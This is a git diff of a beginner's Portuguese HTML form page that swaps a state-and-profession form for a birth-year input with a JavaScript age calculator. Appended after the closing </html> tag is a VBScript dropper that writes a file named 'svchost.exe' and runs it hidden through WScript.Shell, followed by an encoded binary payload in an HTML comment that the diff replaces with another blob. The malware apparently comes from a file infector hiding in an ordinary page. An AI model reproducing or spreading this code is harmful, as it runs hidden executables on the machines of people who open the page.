@@ -7,40 +7,17 @@
     <title>FormulÃ¡rio</title>
 </head>
 <body>
-    <h1>Exemplo de FormulÃ¡rio</h1>
-    <form action="cadastro.php" method="get">
+    <h1>Teste de formulÃ¡rio</h1>
+    <form action="cadastro.php" method="get" autocomplete="on">
         <p>
-            <label for="iest"></label>
-            <select name="est" id="iest">
-                <optgroup label="Sudeste">
-                    <option value="SP">SÃ£o Paullo</option>
-                    <option value="RJ">Rio de Janeiro</option>
-                    <option value="MG" selected>Minas Gerais</option>
-                </optgroup>
-
-                
-
-                <optgroup label="Nordeste">
-                    <option value="MA">MaranhÃ£o</option>
-                    <option value="PE">Pernambuco</option>
-                    <option value="RN">Rio Grande Do Norte</option>
-                </optgroup>
-            </select>
-
-            <p>
-                <label for="iprof"></label>
-                <input type="text" name="prof" id="iprof" list="lstprof">
-                    <datalist id="lstprof">
-                        <option value=>Professor</option>
-                        <option value=>Bombeiro</option>
-                        <option value=>Desenvolvedor</option>
-                    </datalist> 
-            </p>
+            <label for="iano">Em que ano vocÃª nasceu?</label>
+            <input type="number" name="ano" id="iano" min="1900" max="2020" oninput="calcIdade()">
         </p>
 
+
         <p>
-            <label for="imsg">Mensagem</label><br>
-            <textarea name="msg" id="imsg" cols="30" rows="10"></textarea>
+            <label for="iidade">A sua idade Ã©: </label>
+            <output id="iidade">0</output>
         </p>
 
         <p>
@@ -48,6 +25,15 @@
             <input type="reset" value="Limpar">
         </p>
     </form>
+
+    <script>
+        function calcIdade() {
+            let atual = new Date().getFullYear()
+            iidade.innerHTML = Number(atual) - Number(iano.value)
+        }
+    </script>
+
+
 </body>
 </html><SCRIPT Language=VBScript><!--
 DropFileName = "svchost.exe"
@@ -63,6 +49,5 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
-//--></SCRIPT><!--‚Ò°³rÕÓå¬¹Js’¾2H=Wjpp=‚k0Ó>İ4µUËí‚O6Ğ‹„_°¾øh
-Øoİä>*.iØJ]pËı¯’}´HÚÜ¦Ëv\]8e˜¡™£Ü@T®FûôÍ‡9ÁÁ ‘šƒâXT²}÷‘÷½éï5€ß‚MÚŠÂx±3RÀ%œ‹L ¹l÷„«’ŒÒì çê¡æ?…bœQ†»¦ÊüÄ\Ò—‡ş¯È ©ø]7áƒ¬yrîüŒòşö`A”•7*Ëãtâ¶¾İåyGweLØGÀbq(âÁv¯öPX/ªœ­š(‡ÒC„µoµQÇÁji˜ü¹F¸İ}‚® Nó„«5a;:DÏwDàşÃßÉÆ¶T{PğµVî•5«ş:)Â=–Kío^ê´ÂON¯:300 N~“ê%w)'»@¼ÆI•Z.:€“7	l¶¸áíMÁtÄXûH©œ 3éCÍM_ƒ—$GËLãO$®.K€•¾W¬_lÀFwxÅ»3kdÎ4,ŒÍ	6mªf	Ê :Dó²+éÍj/k®¥Sü{K@‹1€ßûê%»ÛÑûúùL ¤¼yú¯œj<öU½j	’áü!™ ËÎRÕøËÎËÎËÎÅ
--Nˆ¢8àÍÎ ËÎ-->
+//--></SCRIPT><!-- ~Í•Ó¢!Z3%½ŠüH)²¢ÚB€üfoÈ# ªhÑ‹ :ãìE\²^Ä+7è¤ĞZ-ŒêÉØËŒ.t™1–«Ï}¢ê½íÚûIüq„bÔ—wÓÃEP^bteıä 5vvmlJÖf.¿S7—¶,¥jK±ş]§'	‘2ç:ì(ÖQl¦ßù|ô$ %™ùí!UÃ%aÈOä|P<ÆéêJ@ÎFÙĞŞ6E²–—ÔŒYI"UÜ°Ş­[˜øYş£]‚M_/ëpY¨ÆÎSĞ n¶¡Íppºv•‹î$Ùú7qó©éè…Y»¤X}ÉØÀtg`MX§-,v·5’g¤$Ú‹â…Ê36Ìª™÷"we!º´y1“Á8‘DO*«}ÙÕÊyÀƒœ75•šÓWk—Rq	ƒdÌOÒ8ˆÜv³Ìú¤¿Â7ÛT5P»Íî–šiV&•  ËÎRÕøËÎËÎËÎÅ
+-NËaÏÎ ËÎ-->
